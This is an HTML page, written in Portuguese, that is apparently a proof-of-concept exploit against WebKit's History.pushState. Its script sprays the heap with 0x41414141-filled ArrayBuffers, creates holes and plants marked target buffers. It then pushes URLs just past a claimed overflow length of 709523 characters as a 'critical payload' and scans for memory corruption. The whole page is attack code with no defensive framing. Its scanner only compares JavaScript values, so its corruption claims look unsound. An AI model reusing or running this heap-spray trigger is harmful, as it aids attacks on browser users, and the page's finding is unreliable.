<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>WebKit History.pushState – Metodologia 6-3-1 + Scanner</title>
  <style>
    body { font-family: monospace; background: #111; color: #ddd; }
    button { margin: 6px 0; }
    #log { max-height: 60vh; overflow-y: auto; border: 1px solid #333; padding: 8px; }
    .ok { color: #7CFC00; }
    .warn { color: #FFD700; }
    .bad { color: #FF6347; }
  </style>
</head>
<body>

<h2>WebKit History.pushState – Metodologia 6-3-1 + Scanner (Teste 9)</h2>

<button onclick="runAll()">Executar Fluxo Completo (6-3-1 → T1 → T9)</button>
<button onclick="clearLog()">Limpar Log</button>

<div id="log"></div>

<script>
// ================================================================
// CONSTANTES DO ACHADO
// ================================================================
const BASE_SAFE = 709522;
const OVERFLOW_START = 709523;
const MIN_ALLOWED = 0x00;
const MAX_ALLOWED = 0x20;

// ================================================================
// LOG
// ================================================================
function log(msg, cls="") {
  const el = document.getElementById('log');
  const t = new Date().toLocaleTimeString();
  const d = document.createElement('div');
  if (cls) d.className = cls;
  d.textContent = `[${t}] ${msg}`;
  el.appendChild(d);
  el.scrollTop = el.scrollHeight;
}
function clearLog() { document.getElementById('log').innerHTML = ""; }

// ================================================================
// HEAP / ALVOS
// ================================================================
let spray = [];
let targets = [];

function prepareHeap() {
  spray = [];
  targets = [];

  // Spray principal
  for (let i = 0; i < 800; i++) {
    const b = new ArrayBuffer(1024);
    new Uint32Array(b).fill(0x41414141);
    spray.push(b);
  }

  // Criar buracos
  for (let i = 0; i < spray.length; i += 4) spray[i] = null;

  // Alvos monitorados
  for (let i = 0; i < 40; i++) {
    const buf = new ArrayBuffer(1024);
    const view = new Uint32Array(buf);
    view.fill(0xDEADBEEF);
    targets.push({
      id: i,
      magic: 0xCAFEBABE,
      buf,
      view
    });
  }

  log("Heap preparado: spray + alvos", "ok");
}

// ================================================================
// TESTE 6 – CRESCIMENTO CONTROLADO (BYTES VÁLIDOS)
// ================================================================
function test6_incremental() {
  log("TESTE 6: crescimento incremental (bytes 0x00–0x20)");
  const base = "A".repeat(BASE_SAFE);

  let payload = "";
  for (let i = 0; i < 12000; i++) {
    payload += String.fromCharCode(i % (MAX_ALLOWED + 1));
  }

  history.pushState({}, "t6", "/" + base + payload);
  log("Teste 6 aplicado", "ok");
}

// ================================================================
// TESTE 3 – SEQUÊNCIAS DE CONTROLE
// ================================================================
function test3_sequences() {
  log("TESTE 3: sequências de controle");
  const base = "A".repeat(BASE_SAFE);
  let seq = "";

  const bytes = [0x00, 0x09, 0x0A, 0x0D, 0x20];
  for (let i = 0; i < 2000; i++) {
    for (let b of bytes) seq += String.fromCharCode(b);
  }

  history.pushState({}, "t3", "/" + base + seq);
  log("Teste 3 aplicado", "ok");
}

// ================================================================
// TESTE 1 – PAYLOAD CRÍTICO (DISPARO)
// ================================================================
function test1_critical() {
  log("TESTE 1: payload crítico (709523+)");
  const base = "A".repeat(BASE_SAFE);

  let overflow = "";
  for (let i = 0; i < 64; i++) {
    overflow += String.fromCharCode(i % (MAX_ALLOWED + 1));
  }

  history.pushState({}, "t1", "/" + base + overflow);
  log("Teste 1 executado – estado crítico atingido", "warn");
}

// ================================================================
// TESTE 9 – SCANNER SINCRONIZADO
// ================================================================
function snapshotTargets() {
  return targets.map(t => ({
    id: t.id,
    magic: t.magic,
    first: t.view[0],
    second: t.view[1]
  }));
}

function perturbHeapLight() {
  // perturbação mínima para expor race/cleanup
  const tmp = [];
  for (let i = 0; i < 50; i++) tmp.push(new ArrayBuffer(256));
}

function scanDiff(a, b) {
  let diffs = 0;
  for (let i = 0; i < a.length; i++) {
    if (a[i].magic !== b[i].magic ||
        a[i].first !== b[i].first ||
        a[i].second !== b[i].second) {
      log(
        `CORRUPÇÃO alvo ${i}: ` +
        `magic ${a[i].magic.toString(16)}→${b[i].magic.toString(16)} | ` +
        `v0 ${a[i].first.toString(16)}→${b[i].first.toString(16)}`,
        "bad"
      );
      diffs++;
    }
  }
  return diffs;
}

function test9_scanner() {
  log("TESTE 9: scanner pós-condição (sincronizado)");

  const snap1 = snapshotTargets();
  perturbHeapLight();
  const snap2 = snapshotTargets();

  const changes = scanDiff(snap1, snap2);

  if (changes === 0) {
    log("Nenhuma alteração detectada (estado estável)", "ok");
  } else {
    log(`MEMÓRIA ALTERADA: ${changes} alvos`, "bad");
  }
}

// ================================================================
// FLUXO COMPLETO 6-3-1 → SCANNER
// ================================================================
function runAll() {
  log("======================================");
  log("INICIANDO METODOLOGIA 6-3-1 + TESTE 9");
  log("======================================");

  prepareHeap();

  // 6
  test6_incremental();
  // 3
  test3_sequences();
  // 1 (disparo)
  test1_critical();
  // 9 (scanner imediato)
  test9_scanner();

  log("Fluxo concluído");
}
</script>

</body>
</html>

